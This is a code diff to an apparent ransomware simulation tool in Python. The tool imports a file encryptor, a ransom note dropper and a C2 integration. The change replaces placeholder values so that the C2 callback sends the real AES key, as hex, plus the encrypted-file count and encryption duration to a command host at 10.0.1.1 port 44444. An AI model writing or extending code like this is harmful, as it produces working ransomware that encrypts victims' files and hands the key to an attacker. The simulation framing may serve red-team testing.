@@ -35,7 +35,7 @@ import sys
 import config
 from modules.callback import C2Integration
 from modules.cleanup import Cleanup
-from modules.evaluation import EvaluationCollector
+from modules.evaluation import EvaluationCollector, SimulationReport
 from modules.file_encryptor import FileEncryptor
 from modules.ransom_note import RansomNoteDropper
 from modules.seeder import Seeder
@@ -165,8 +165,8 @@ def run_encrypt() -> None:
     collector.record_note_drop(note_paths)
 
     _save_session(key, enc_results)
-    run_c2_callback()
     report = collector.finalize()
+    run_c2_callback(report, key)
     collector.export_json(report, config.REPORT_FILE)
     logger.info(
         "Encrypt phase done: %d/%d files. Report → '%s'",
@@ -176,16 +176,15 @@ def run_encrypt() -> None:
     )
 
 
-def run_c2_callback() -> None:
+def run_c2_callback(report: SimulationReport, key: bytes) -> None:
     c2 = C2Integration(
         c2_host="10.0.1.1",
         c2_port=44444,
     )
     c2_payload = c2._to_payload(
-        ip="localhost",
-        aes_key="test_key",
-        file_encrypted=10,
-        duration=10,
+        aes_key=key.hex(),
+        file_encrypted=report.total_files_encrypted,
+        duration=report.encryption_duration_seconds,
     )
     c2.send(c2_payload)
 
